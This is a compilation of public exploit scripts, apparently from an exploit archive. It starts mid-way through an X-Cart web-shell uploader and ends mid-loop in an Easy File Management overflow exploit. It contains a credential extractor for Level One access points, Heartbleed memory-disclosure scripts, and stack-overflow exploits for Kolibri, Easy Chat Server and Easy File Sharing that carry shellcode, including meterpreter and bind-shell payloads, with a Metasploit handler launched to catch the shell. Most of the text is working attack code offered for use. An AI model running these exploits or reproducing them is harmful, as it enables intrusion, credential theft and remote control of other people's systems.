    exit("ERROR: Incorrect username or password")

if upload(requestSession, url + fileManagerPath, shellFileName, shellContent):
    print("successful: file uploaded")
else:
    exit("ERROR: could not upload file")

runShell(url + shellFileName + "?x=")


Blog Reference:
http://blog.curesec.com/article/blog/XCart-526-Code-Execution-Exploit-87.html
source: http://www.securityfocus.com/bid/63168/info

Multiple Level One Enterprise Access Point devices are prone to a security bypass vulnerability.

Successfully exploiting this issue may allow an attacker to gain access to sensitive configuration information including credentials. This may aid in further attacks.

Level One EAP-110 and EAP-200 running firmware 2.00.03 build 1.50-1.5045 are vulnerable; other versions may also be affected. 

# tellpassword.py
#
# Extracts user accounts from Level1 (ip4net)
# EAP-200 (and other) Wifi Access Points
#
# (c) 2013 sigma star gmbh

import sys, re

attribRegex = re.compile(r"(\w+)=\"([^\"]*)\"")

if (len(sys.argv) != 2):
    print "USAGE: %s config-backup.conf" % sys.argv[0]
    exit(1)

# decrypt config
encrypted = open(sys.argv[1], 'rb')
plain = open('plain.xml', 'w')
cntr = 0
encrypted.seek(128)
byte = encrypted.read(1)
print "Decrypting config file into plain.xml"
while byte:
    plainOrd = ((ord(byte) ^ 0xff) + cntr) % 0x80
    plain.write(chr(plainOrd))
    cntr = (cntr + 1) % 0x40
    byte = encrypted.read(1)
encrypted.close()
plain.close()

# find user accounts
print "Parsing accounts..."
plain = open('plain.xml', 'r')
for line in plain:
    if "<user" in line:
        user = None
        password = None
        for match in attribRegex.finditer(line):
            attrib = match.group(1)
            if attrib == "name":
                user = match.group(2)
            elif attrib == "password":
                password = match.group(2)
        if len(password) > 0:
                print " - %s: %s" % (user, password)
plain.close()
#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print 'No heartbeat response received, server likely not vulnerable'
            return False

        if typ == 24:
            print 'Received heartbeat response:'
            hexdump(pay)
            if len(pay) > 3:
                print 'WARNING: server returned more data than it should - server is vulnerable!'
            else:
                print 'Server processed malformed heartbeat, but did not return any extra data.'
            return True

        if typ == 21:
            print 'Received alert:'
            hexdump(pay)
            print 'Server returned error, likely not vulnerable'
            return False

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print 'Connecting...'
    sys.stdout.flush()
    s.connect((args[0], opts.port))
    print 'Sending Client Hello...'
    sys.stdout.flush()
    s.send(hello)
    print 'Waiting for Server Hello...'
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print 'Server closed connection without sending Server Hello.'
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    print 'Sending heartbeat request...'
    sys.stdout.flush()
    s.send(hb)
    hit_hb(s)

if __name__ == '__main__':
    main()
# Exploit Title: [OpenSSL TLS Heartbeat Extension - Memory Disclosure - Multiple SSL/TLS versions]
# Date: [2014-04-09]
# Exploit Author: [Csaba Fitzl]
# Vendor Homepage: [http://www.openssl.org/]
# Software Link: [http://www.openssl.org/source/openssl-1.0.1f.tar.gz]
# Version: [1.0.1f]
# Tested on: [N/A]
# CVE : [2014-0160]


#!/usr/bin/env python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
# Modified by Csaba Fitzl for multiple SSL / TLS version support

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')

def h2bin(x):
	return x.replace(' ', '').replace('\n', '').decode('hex')

version = []
version.append(['SSL 3.0','03 00'])
version.append(['TLS 1.0','03 01'])
version.append(['TLS 1.1','03 02'])
version.append(['TLS 1.2','03 03'])

def create_hello(version):
	hello = h2bin('16 ' + version + ' 00 dc 01 00 00 d8 ' + version + ''' 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')
	return hello

def create_hb(version):
	hb = h2bin('18 ' + version + ' 00 03 01 40 00')
	return hb

def hexdump(s):
	for b in xrange(0, len(s), 16):
		lin = [c for c in s[b : b + 16]]
		hxdat = ' '.join('%02X' % ord(c) for c in lin)
		pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
		print '  %04x: %-48s %s' % (b, hxdat, pdat)
	print

def recvall(s, length, timeout=5):
	endtime = time.time() + timeout
	rdata = ''
	remain = length
	while remain > 0:
		rtime = endtime - time.time()
		if rtime < 0:
			return None
		r, w, e = select.select([s], [], [], 5)
		if s in r:
			data = s.recv(remain)
			# EOF?
			if not data:
				return None
			rdata += data
			remain -= len(data)
	return rdata


def recvmsg(s):
	hdr = recvall(s, 5)
	if hdr is None:
		print 'Unexpected EOF receiving record header - server closed connection'
		return None, None, None
	typ, ver, ln = struct.unpack('>BHH', hdr)
	pay = recvall(s, ln, 10)
	if pay is None:
		print 'Unexpected EOF receiving record payload - server closed connection'
		return None, None, None
	print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
	return typ, ver, pay

def hit_hb(s,hb):
	s.send(hb)
	while True:
		typ, ver, pay = recvmsg(s)
		if typ is None:
			print 'No heartbeat response received, server likely not vulnerable'
			return False

		if typ == 24:
			print 'Received heartbeat response:'
			hexdump(pay)
			if len(pay) > 3:
				print 'WARNING: server returned more data than it should - server is vulnerable!'
			else:
				print 'Server processed malformed heartbeat, but did not return any extra data.'
			return True

		if typ == 21:
			print 'Received alert:'
			hexdump(pay)
			print 'Server returned error, likely not vulnerable'
			return False

def main():
	opts, args = options.parse_args()
	if len(args) < 1:
		options.print_help()
		return
	for i in range(len(version)):
		print 'Trying ' + version[i][0] + '...'
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print 'Connecting...'
		sys.stdout.flush()
		s.connect((args[0], opts.port))
		print 'Sending Client Hello...'
		sys.stdout.flush()
		s.send(create_hello(version[i][1]))
		print 'Waiting for Server Hello...'
		sys.stdout.flush()
		while True:
			typ, ver, pay = recvmsg(s)
			if typ == None:
				print 'Server closed connection without sending Server Hello.'
				return
			# Look for server hello done message.
			if typ == 22 and ord(pay[0]) == 0x0E:
				break

		print 'Sending heartbeat request...'
		sys.stdout.flush()
		s.send(create_hb(version[i][1]))
		if hit_hb(s,create_hb(version[i][1])):
			#Stop if vulnerable
			break

if __name__ == '__main__':
	main()source: http://www.securityfocus.com/bid/33674/info

PyCrypto (Python Cryptography Toolkit) is prone to a buffer-overflow vulnerability because it fails to adequately verify user-supplied input.

Successful exploits may allow attackers to execute arbitrary code in the context of applications using the vulnerable module. Failed attempts may lead to a denial-of-service condition.

# -*- coding: utf-8 -*-
#
#  SelfTest/Cipher/ARC2.py: Self-test for the Alleged-RC2 cipher
#
# =======================================================================
# Copyright (C) 2008  Dwayne C. Litzenberger <dlitz@dlitz.net>
#
# Permission is hereby granted, free of charge, to any person obtaining
# a copy of this software and associated documentation files (the
# "Software"), to deal in the Software without restriction, including
# without limitation the rights to use, copy, modify, merge, publish,
# distribute, sublicense, and/or sell copies of the Software, and to
# permit persons to whom the Software is furnished to do so.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
# A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
# OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
# LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
# =======================================================================
#

"""Self-test suite for Crypto.Cipher.ARC2"""

__revision__ = "$Id$"

from common import dict     # For compatibility with Python 2.1 and 2.2

import unittest

# This is a list of (plaintext, ciphertext, key[, description[, extra_params]]) tuples.
test_data = [
    # Test vectors from RFC 2268

    # 63-bit effective key length
    ('0000000000000000', 'ebb773f993278eff', '0000000000000000',
        'RFC2268-1', dict(effective_keylen=63)),

    # 64-bit effective key length
    ('ffffffffffffffff', '278b27e42e2f0d49', 'ffffffffffffffff',
        'RFC2268-2', dict(effective_keylen=64)),
    ('1000000000000001', '30649edf9be7d2c2', '3000000000000000',
        'RFC2268-3', dict(effective_keylen=64)),
    ('0000000000000000', '61a8a244adacccf0', '88',
        'RFC2268-4', dict(effective_keylen=64)),
    ('0000000000000000', '6ccf4308974c267f', '88bca90e90875a',
        'RFC2268-5', dict(effective_keylen=64)),
    ('0000000000000000', '1a807d272bbe5db1', '88bca90e90875a7f0f79c384627bafb2',
        'RFC2268-6', dict(effective_keylen=64)),

    # 128-bit effective key length
    ('0000000000000000', '2269552ab0f85ca6', '88bca90e90875a7f0f79c384627bafb2',
        "RFC2268-7", dict(effective_keylen=128)),
    ('0000000000000000', '5b78d3a43dfff1f1',
        '88bca90e90875a7f0f79c384627bafb216f80a6f85920584c42fceb0be255daf1e',
        "RFC2268-8", dict(effective_keylen=129)),

    # Test vectors from PyCrypto 2.0.1's testdata.py
    # 1024-bit effective key length
    ('0000000000000000', '624fb3e887419e48', '5068696c6970476c617373',
        'PCTv201-0'),
    ('ffffffffffffffff', '79cadef44c4a5a85', '5068696c6970476c617373',
        'PCTv201-1'),
    ('0001020304050607', '90411525b34e4c2c', '5068696c6970476c617373',
        'PCTv201-2'),
    ('0011223344556677', '078656aaba61cbfb', '5068696c6970476c617373',
        'PCTv201-3'),
    ('0000000000000000', 'd7bcc5dbb4d6e56a', 'ffffffffffffffff', 'PCTv201-4'),
    ('ffffffffffffffff', '7259018ec557b357', 'ffffffffffffffff', 'PCTv201-5'),
    ('0001020304050607', '93d20a497f2ccb62', 'ffffffffffffffff', 'PCTv201-6'),
    ('0011223344556677', 'cb15a7f819c0014d', 'ffffffffffffffff', 'PCTv201-7'),
    ('0000000000000000', '63ac98cdf3843a7a',
        'ffffffffffffffff5065746572477265656e6177617953e5ffe553',
        'PCTv201-8'),
    ('ffffffffffffffff', '3fb49e2fa12371dd',
        'ffffffffffffffff5065746572477265656e6177617953e5ffe553',
        'PCTv201-9'),
    ('0001020304050607', '46414781ab387d5f',
        'ffffffffffffffff5065746572477265656e6177617953e5ffe553',
        'PCTv201-10'),
    ('0011223344556677', 'be09dc81feaca271',
        'ffffffffffffffff5065746572477265656e6177617953e5ffe553',
        'PCTv201-11'),
    ('0000000000000000', 'e64221e608be30ab', '53e5ffe553', 'PCTv201-12'),
    ('ffffffffffffffff', '862bc60fdcd4d9a9', '53e5ffe553', 'PCTv201-13'),
    ('0001020304050607', '6a34da50fa5e47de', '53e5ffe553', 'PCTv201-14'),
    ('0011223344556677', '584644c34503122c', '53e5ffe553', 'PCTv201-15'),
]

class BufferOverflowTest(unittest.TestCase):
    # Test a buffer overflow found in older versions of PyCrypto

    def setUp(self):
        global ARC2
        from Crypto.Cipher import ARC2

    def runTest(self):
        """ARC2 with keylength > 128"""
        key = "x" * 16384
        mode = ARC2.MODE_ECB
        self.assertRaises(ValueError, ARC2.new, key, mode)

def get_tests(config={}):
    from Crypto.Cipher import ARC2
    from common import make_block_tests

    tests = make_block_tests(ARC2, "ARC2", test_data)
    tests.append(BufferOverflowTest())

    return tests

if __name__ == '__main__':
    import unittest
    suite = lambda: unittest.TestSuite(get_tests())
    unittest.main(defaultTest='suite')

# vim:set ts=4 sw=4 sts=4 expandtab:
source: http://www.securityfocus.com/bid/33971/info

Wesnoth is prone to a remote code-execution vulnerability caused by a design error.

Attackers can exploit this issue to execute arbitrary Python code in the context of the user running the vulnerable application.

Versions prior to Wesnoth 1.5.11 are affected.

#!WPY
import threading
os = threading._sys.modules['os']
f = os.popen("firefox 'http://www.example.com'")
f.close() #!/usr/bin/python 
# Exploit Title: Kolibri GET request Stack buffer Overflow 
# Date: 25 April 2014
# Exploit Author: Christian (Polunchis) Ramirez https://intrusionlabs.org
# Vendor Homepage: http://www.senkas.com/kolibri/download.php
# Version: Kolibri 2.0 
# Tested on: Windows XP SP3,  Spanish
# Thanks:To my wife for putting up with my possessions
# Description: 
# A buffer overflow is triggered when a long GET command is sent to the server.

import socket, sys, os, time 

if len(sys.argv) != 3:
	print "[*] Uso: %s <Ip Victima> <Puerto> \n" % sys.argv[0]
        print "[*] Exploit created by Polunchis"
        print "[*] https://www.intrusionlabs.com.mx"
	sys.exit(0)
host = sys.argv[1]         
port = int(sys.argv[2])
 
#./msfpayload windows/meterpreter/bind_tcp R | ./msfencode -t c -b '\x00\xff\x0a\x0d\x20\x40'
shellcode = (
"\x29\xc9\x83\xe9\xb5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xaa\x86\x33\x5f\x83\xee\xfc\xe2\xf4\x56\x6e\xba\x5f\xaa\x86"
"\x53\xd6\x4f\xb7\xe1\x3b\x21\xd4\x03\xd4\xf8\x8a\xb8\x0d\xbe"
"\x0d\x41\x77\xa5\x31\x79\x79\x9b\x79\x02\x9f\x06\xba\x52\x23"
"\xa8\xaa\x13\x9e\x65\x8b\x32\x98\x48\x76\x61\x08\x21\xd4\x23"
"\xd4\xe8\xba\x32\x8f\x21\xc6\x4b\xda\x6a\xf2\x79\x5e\x7a\xd6"
"\xb8\x17\xb2\x0d\x6b\x7f\xab\x55\xd0\x63\xe3\x0d\x07\xd4\xab"
"\x50\x02\xa0\x9b\x46\x9f\x9e\x65\x8b\x32\x98\x92\x66\x46\xab"
"\xa9\xfb\xcb\x64\xd7\xa2\x46\xbd\xf2\x0d\x6b\x7b\xab\x55\x55"
"\xd4\xa6\xcd\xb8\x07\xb6\x87\xe0\xd4\xae\x0d\x32\x8f\x23\xc2"
"\x17\x7b\xf1\xdd\x52\x06\xf0\xd7\xcc\xbf\xf2\xd9\x69\xd4\xb8"
"\x6d\xb5\x02\xc2\xb5\x01\x5f\xaa\xee\x44\x2c\x98\xd9\x67\x37"
"\xe6\xf1\x15\x58\x55\x53\x8b\xcf\xab\x86\x33\x76\x6e\xd2\x63"
"\x37\x83\x06\x58\x5f\x55\x53\x63\x0f\xfa\xd6\x73\x0f\xea\xd6"
"\x5b\xb5\xa5\x59\xd3\xa0\x7f\x11\x02\x84\xf9\xee\x31\x5f\xbb"
"\xda\xba\xb9\xc0\x96\x65\x08\xc2\x44\xe8\x68\xcd\x79\xe6\x0c"
"\xfd\xee\x84\xb6\x92\x79\xcc\x8a\xf9\xd5\x64\x37\xde\x6a\x08"
"\xbe\x55\x53\x64\xc8\xc2\xf3\x5d\x12\xcb\x79\xe6\x35\xaa\xec"
"\x37\x09\xfd\xee\x31\x86\x62\xd9\xcc\x8a\x21\xb0\x59\x1f\xc2"
"\x86\x23\x5f\xaa\xd0\x59\x5f\xc2\xde\x97\x0c\x4f\x79\xe6\xcc"
"\xf9\xec\x33\x09\xf9\xd1\x5b\x5d\x73\x4e\x6c\xa0\x7f\x87\xf0"
"\x76\x6c\x03\xc5\x2a\x46\x45\x33\x5f"
)

nop =  "A" * 33 + '\x90' * 20
junk = "C" *(515-(len(nop)+len(shellcode)))
opcode= "\x83\xc4\x44\x83\xc4\x44\x83\xc4\x44\xff\xe4"
eip = '\x63\x46\x92\x7c'
#7c86467b 7C924663 call esp
buffer = nop + shellcode + junk + eip + opcode + "B" * 60 

req = ("GET /" + buffer + " HTTP/1.1\r\n"
"Host: " + host + ":" + str(port) + "\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Connection: keep-alive\r\n\r\n")
print "  [+] Connecting to %s:%d" % (host, port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((host, port))
	print "  [+] Sending payload.." + "nop: " + str(len(nop)) + "   junk: " + str(len(junk)) + "   shellcode: " + str(len(shellcode))
	s.send(req)
	data = s.recv(1024)
	print "  [+] Closing connection.."
	s.close()
	print "[+] Exploit Sent Successfully"
    	print "[+] Waiting for 3 sec before spawning shell to " + host + ":4444\r"
    	print "\r"
    	time.sleep(3)
        os.system("msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/bind_tcp RHOST=192.168.0.106 LPORT=4444 E")
    	print "[-] Connection lost from " + host + ":4444 \r"
except:
    	print "[-] Could not connect to " + host + ":4444\r"
        sys.exit(0) 
## Exploit-DB Note: The offset to SEH is influenced by the installation path of the program.
## For this specific exploit to work, easy chat must be installed to:
## 'C:\Program Files\EFS Software\Easy Chat Server'


# Exploit Title: Easy Chat Server 3.1 stack buffer overflow
# Date: 9 May 2014
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.echatserver.com/
# Software Link: http://www.echatserver.com/
# Version: 3.1
# Tested on: Windows 7 Enterprise SP1, English
#
# Description: 
# A buffer overflow is triggered when when passing a long username.


import socket
import struct

# calc shellcode from https://code.google.com/p/win-exec-calc-shellcode/
# msfencode -b "\x00\x20" -i w32-exec-calc-shellcode.bin 
# [*] x86/shikata_ga_nai succeeded with size 101 (iteration=1)
shellcode = ( 
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9" +
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56" +
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9" +
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97" +
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64" +
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8" +
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a" +
"\x1c\x39\xbd"
)

# SEH overwritten at offset 207 when Easy Chat Server is  
# installed in C:\Program Files\EFS Software\Easy Chat Server
payload =  "A"*203
payload += "\xeb\x06\x90\x90"           # short jmp to shellcode
payload += "\x1e\x0e\x01\x10"           # pop/pop/ret @ 0x10010E1E SSLEAY32.DLL
payload += "\x81\xc4\xd8\xfe\xff\xff"   # add esp,-128
payload += shellcode                    # calc.exe
payload += "D"*193

buf = (
"GET /chat.ghp?username=" + payload + "&password=&room=1&sex=1 HTTP/1.1\r\n"
"User-Agent: Mozilla/4.0\r\n"
"Host: 192.168.1.136:80\r\n"
"Accept-Language: en-us\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://192.168.1.136\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.123.131", 80))
s.send(buf)
print s.recv(1024)
# Exploit Title: Easy File Sharing Web Server 6.8 stack buffer overflow
# Date: 10 May 2014
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.efssoft.com
# Software Link: http://www.sharing-file.com/efssetup.exe
# Version: 6.8
# Tested on: English version of Windows XP Professional SP2 and SP3
#
# Description: 
# By setting UserID in the cookie to a long string, we can overwrite EDX which 
# allows us to control execution flow when the following instruction is 
# executed:
#
# 0x0045C8C2: CALL DWORD PTR DS:[EDX+28]
#
# We can point EDX+28 to a location in the stack containing a pointer to 
# instructions we want to execute. This pointer can be placed at 0x01??6969. 
# Under Windows XP Professional SP2/SP3, the first, third, and fourth bytes 
# in the address are always the same. The second byte is random so we need 
# to bruteforce it. This takes at most 255 tries and the server doesn't crash 
# so we can keep trying. 
#
# The pointer placed at 0x01??6969 is a pointer to a CALL ESI. ESI points to 
# a small space in our payload. We fill this small space with instructions to 
# jump further down the stack where our shellcode is stored. 
#
# Tested with Easy File Sharing Webserver installed in the default location at 
# C:\EFS Software\Easy File Sharing Web Server
#

import socket
import struct
import time
import sys

target = "192.168.1.140"
port = 80

# Shellcode from https://code.google.com/p/w32-bind-ngs-shellcode/
# Binds a shell on port 28876
# msfencode -b '\x00\x20' -i w32-bind-ngs-shellcode.bin 
# [*] x86/shikata_ga_nai succeeded with size 241 (iteration=1)
shellcode = ( 
"\xbb\xa1\x68\xde\x7c\xdd\xc0\xd9\x74\x24\xf4\x58\x33\xc9" +
"\xb1\x36\x31\x58\x14\x83\xe8\xfc\x03\x58\x10\x43\x9d\xef" +
"\xb5\xe7\xd5\x61\x76\x6c\x9f\x8d\xfd\x04\x7c\x05\x6f\xe0" +
"\xf7\x67\x50\x7b\x31\xa0\xdf\x63\x4b\x23\x8e\xfb\x81\x9c" +
"\x02\xc9\x8d\x44\x33\x5a\x3d\xe1\x0c\x2b\xc8\x69\xfb\xd5" +
"\x7e\x8a\xd5\xd5\xa8\x41\xac\x02\x7c\xaa\x05\x8d\xd0\x0c" +
"\x0b\x5a\x82\x0d\x44\x48\x80\x5d\x10\xcd\xf4\xea\x7a\xf0" +
"\x7c\xec\x69\x81\x36\xce\x6c\x7c\x9e\x3f\xbd\x3c\x94\x74" +
"\xd0\xc1\x44\xc0\xe4\x6d\xac\x58\x21\xa9\xf1\xeb\x44\xc6" +
"\x30\x2b\xd2\xc3\x1b\xb8\x57\x37\xa5\x57\x68\x80\xb1\xf6" +
"\xfc\xa5\xa5\xf9\xeb\xb0\x3e\xfa\xef\x53\x15\x7d\xd1\x5a" +
"\x1f\x76\xa3\x02\xdb\xd5\x44\x6a\xb4\x4c\x3a\xb4\x48\x1a" +
"\x8a\x96\x03\x1b\x3c\x8b\xa3\x34\x28\x52\x74\x4b\xac\xdb" +
"\xb8\xd9\x43\xb4\x13\x48\x9b\xea\xe9\xb3\x17\xf2\xc3\xe1" +
"\x8a\x6a\x47\x6b\x4f\x4a\x0a\x0f\xab\xb2\xbf\x5b\x18\x04" +
"\xf8\x72\x5e\xdc\x80\xb9\x45\x8b\xdc\x93\xd7\xf5\xa6\xfc" +
"\xd0\xae\x7a\x51\xb6\x02\x84\x03\xdc\x29\x3c\x50\xf5\xe7" +
"\x3e\x57\xf9"
)

print "[+] We're guessing an address on the stack. It will be a few minutes..."

for i in xrange(1,255):
    n = ""
    if i < 16:
        n = "0" + hex(i)[-1]
    else:
        n = hex(i)[2:]

    # craft the value of EDX that will be used in CALL DWORD PTR DS:[EDX+28]
    guess = "0x01" + n + "6940"
    sys.stdout.write("=");
 
    payload =  "A"*64                            # padding
    payload += "\x81\xee\x70\xff\xff\xff"        # SUB ESI,-90
    payload += "\xff\xe6"                        # JMP ESI

    payload += "A"*8                             # padding
    payload += struct.pack("<I", int(guess, 16)) # overwrite EDX with 
                                                 # pointer to CALL ESI

    payload += "C"*108                           # padding
    payload += struct.pack("<I", 0x10023701)     # pointer to CALL ESI
    payload += "\x90"*20                         # NOP sled
    payload += shellcode                         # calc.exe

    # craft the request
    buf = (
    "GET /vfolder.ghp HTTP/1.1\r\n"
    "User-Agent: Mozilla/4.0\r\n"
    "Host:" + target + ":" + str(port) + "\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    "Accept-Language: en-us\r\n"
    "Accept-Encoding: gzip, deflate\r\n"
    "Referer: http://" + target + "/\r\n"
    "Cookie: SESSIONID=6771; UserID=" + payload + "; PassWD=;\r\n"
    "Conection: Keep-Alive\r\n\r\n"
    )

    # send the request and payload to the server
    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s1.connect((target, port))
    s1.send(buf)
    s1.close()
    
    try:
        # check if we guessed the correct address by connecting to port 28876
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2.connect((target, 28876))
        s2.close()
        print "\n[+] Success! A shell is waiting on port 28876!"
        break
    except Exception,e:
        pass

#!/usr/bin/env python

# Exploit Title: Easy File Management Web Server 5.3 stack buffer overflow
# Date: 19 May 2014
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.efssoft.com
# Software Link: http://www.web-file-management.com/download.php
# Version: 5.3
# Tested on: English version of Windows XP Professional SP2 and SP3
#
# Description: 
# By setting UserID in the cookie to a long string, we can overwrite EDX which 
# allows us to control execution flow when the following instruction is 
# executed:
#
# 0x00468702: call dword ptr [edx+28h]
# 
# Very similar to Easy File Sharing Web Server 6.8 exploit here: 
# http://www.exploit-db.com/exploits/33352/
# I suspect their other web server solutions might be vulnerable to a similar 
# overflow.
#
# Tested with Easy File Management Web Server installed in the default location 
# at C:\EFS Software\Easy File Management Web Server


import socket
import struct
import sys

target = "172.16.229.134"
port = 80

# calc shellcode from https://code.google.com/p/win-exec-calc-shellcode/
# msfencode -b "\x00\x20" -i w32-exec-calc-shellcode.bin 
# [*] x86/shikata_ga_nai succeeded with size 101 (iteration=1)
shellcode = ( 
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9" +
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56" +
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9" +
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97" +
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64" +
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8" +
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a" +
"\x1c\x39\xbd"
)

for i in xrange(1,255):
    n = ""
    if i < 16:
        n = "0" + hex(i)[-1]
    else:
        n = hex(i)[2:]

    # craft the value of EDX that will be used in CALL DWORD PTR DS:[EDX+28]
    # only second byte changes in the stack address changes, so we can brute 
    # force it
    guess = "0x01" + n + "9898"
    print "trying", guess

